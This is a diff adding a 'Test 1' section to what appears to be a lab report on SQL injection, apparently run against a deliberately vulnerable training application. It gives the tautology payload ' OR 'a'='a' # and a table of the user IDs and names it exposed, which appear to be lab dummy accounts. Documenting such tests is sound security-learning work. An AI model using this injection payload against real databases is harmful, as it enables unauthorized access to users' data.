@@ -50,3 +50,27 @@ The following information was exposed:
 | 4 | Pablo | Picasso | 
 | 5 | Bob | Smith |
 
+### Test 1: 
+### Payload:
+
+' OR 'a'='a' #
+
+## Result Observed
+
+# screenshot
+
+## Data exposed: 
+
+## The following information was exposed:
+-	User IDs
+-	First Names
+- Surnames
+
+| User ID | First Name | Surname | 
+|----------|------------|----------| 
+| 1 | admin | admin | 
+| 2 | Gordon | Brown | 
+| 3 | Hack | Me | 
+| 4 | Pablo | Picasso | 
+| 5 | Bob | Smith |
+
